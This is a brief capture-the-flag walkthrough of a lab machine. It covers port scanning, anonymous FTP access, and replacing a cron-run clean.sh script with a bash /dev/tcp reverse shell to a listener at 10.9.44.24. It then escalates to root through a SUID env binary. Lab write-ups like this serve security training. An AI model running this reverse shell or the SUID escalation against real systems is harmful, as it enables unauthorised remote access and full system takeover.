The IP `10.10.59.189`

run : `nmap -sC -sV -oN nmap-initial $IP`

We also noticed that the host hav e the smb client

run `smbclient -L $IP`

and we can see the shares on the smb client 

go to ftp : `ftp $IP` and login `anonymous` without passwd

and download the files

cool, now we know that we have a cron job that cleaning files by see the [`clean.sh](http://clean.sh)`  file and lets edit it and replace the original one with the reverse shell:

get [clean.sh](http://clean.sh) and modify the file by paste the reverse shell:

`bash -i >& /dev/tcp/10.9.44.24/4444 0>&1`

replace [clean.sh](http://clean.sh) in the ftp: go to the following folder where the clean.sh located and run:

`put clean.sh clean.sh`

and on the other tab start `nc: nc -lvnp 4444`

boom we got a shell

here we can find the `user.txt flag`

then we can run the comand for finding the interesting files for priv esc:

`find / -type f -perm -04000 -ls 2>/dev/null`

we see interesting `.env` go to gtfobins and see that we can use it to escalate priv:

run: `/usr/bin/env /bin/sh -p`

and you are `root`

`root.txt flag`